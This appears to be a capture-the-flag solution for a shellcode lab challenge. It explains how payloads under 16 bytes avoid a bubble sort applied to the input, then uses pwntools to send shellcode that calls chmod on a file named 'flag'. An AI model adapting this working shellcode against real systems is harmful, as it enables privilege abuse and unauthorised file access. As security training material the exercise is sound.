'''
uint64_t *input = shellcode;
    int sort_max = shellcode_size / sizeof(uint64_t) - 1;
    for (int i = 0; i < sort_max; i++)
        for (int j = 0; j < sort_max-i-1; j++)
            if (input[j] > input[j+1])
            {
                uint64_t x = input[j];
                uint64_t y = input[j+1];
                input[j] = y;
                input[j+1] = x;
            }
The uint64_t is 8 bytes
For example shellcode_size is 128 then sort_max =  ( 128 / 8 ) - 1 = 16

Try many size of payload and this is conclusion:
If shellcode_size is < 16 that means the sort_max is equal to 0
'''

from pwn import *

p = process('/challenge/babyshell-level-10', aslr=False)
context.update(arch="amd64")

flag = b'flag'[::-1].hex()

shellcode = asm(f'''
push 0x{flag}
push rsp
pop rdi

push 6
pop rsi

push 0x5a
pop rax
syscall
''')


print(f"Shellcode length: {len(shellcode)} bytes")

p.send(shellcode)
p.interactive()
